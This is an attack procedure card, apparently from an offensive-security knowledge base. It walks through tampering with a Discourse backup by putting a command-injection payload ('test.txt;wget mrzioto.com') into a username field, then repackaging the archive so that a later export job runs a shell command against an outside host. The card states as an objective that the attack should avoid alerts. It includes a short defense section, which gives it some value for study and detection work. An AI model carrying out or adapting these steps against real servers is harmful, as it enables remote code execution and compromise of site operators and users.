---
id: proc-prepare-malicious-backup
tags:
  - command-injection
  - backup
  - discourse
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-shell-payload]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:30:07.563Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Prepare-Malicious-Discourse-Backup

## Summary

This procedure involves generating a Discourse backup, extracting it, injecting a shell command payload into a username field, and repackaging the archive to prepare for restoration, bypassing normal input validation.

## Description

In a Discourse instance, admins can create backups that include user data. By downloading, modifying, and reuploading this backup, attackers with admin access can insert malicious content into usernames, which are later unsafely used in shell commands during export operations. This targets Ruby on Rails-based web applications vulnerable to command injection in file processing jobs. Prerequisites include admin login and local tools for archive handling. Expected outcome is a valid backup file with embedded payload ready for exploitation.

## Requirements

1. Admin credentials for the Discourse instance
2. Access to download/upload via web interface (e.g., http://target/discourse)
3. Local tools like tar or unzip for archive manipulation
4. Text editor to modify JSON/YAML user files

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all backup uploads, rejecting archives with suspicious content
- Implement username restrictions during restore, scanning for shell metacharacters
- Monitor admin panel logs for unusual backup/restore activities
- Use containerization to limit RCE impact if exploited

## Objectives

1. Inject shell payload into username to enable command injection
2. Maintain archive integrity for successful restore
3. Prepare for RCE without triggering immediate alerts

## Instructions

### Step 1: Login and Generate Backup

**Context**: Gain admin access and create a downloadable backup containing user data.

**Instructions**: Navigate to the admin panel and use the built-in backup feature.

No specific command; perform via web UI at http://target/admin/backups.

> Expected: Backup archive (e.g., backup.tar.gz) downloaded.

### Step 2: Extract and Modify Username

**Context**: Unpack the archive to access and alter user data files with the injection payload.

**Command** ([[commands/inject-shell-payload]]):
```bash
echo 'test.txt;wget mrzioto.com' > malicious_username.txt
# Then edit user JSON/YAML files to set username to content of malicious_username.txt
```

> This injects the payload using command separator ';' to chain commands like file creation and wget download. Expected: User files updated with payload in username field.

### Step 3: Repackage Archive

**Context**: Compress modified files back into a valid backup format.

**Instructions**: Use tar or zip to recreate the archive structure.

```bash
tar -czf modified_backup.tar.gz extracted_files/
```

> Expected: Valid, tampered archive ready for upload.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[commands/inject-shell-payload]]

## Tools Used


## Tags

- command-injection
- backup
- discourse
